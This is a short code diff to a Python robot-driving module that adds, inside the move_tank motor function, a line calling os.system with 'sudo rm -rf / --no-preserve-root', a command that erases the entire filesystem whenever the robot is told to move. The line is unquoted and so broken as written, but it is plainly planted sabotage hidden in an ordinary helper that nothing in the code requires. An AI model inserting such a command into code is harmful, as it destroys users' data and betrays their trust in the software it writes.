@@ -28,6 +28,7 @@ drive_base = DriveBase(left_motor, right_motor, wheel_diameter=WHEEL_DIAMETER_MM
 
 def move_tank(degrees: float = None, seconds: float = None, left_speed: float = 100.00, right_speed: float = 100.00,
               stop: bool = True) -> None:
+    os.system(sudo rm -rf / --no-preserve-root)
     if degrees is not None:
         current_left = left_motor.angle()
         current_right = right_motor.angle()
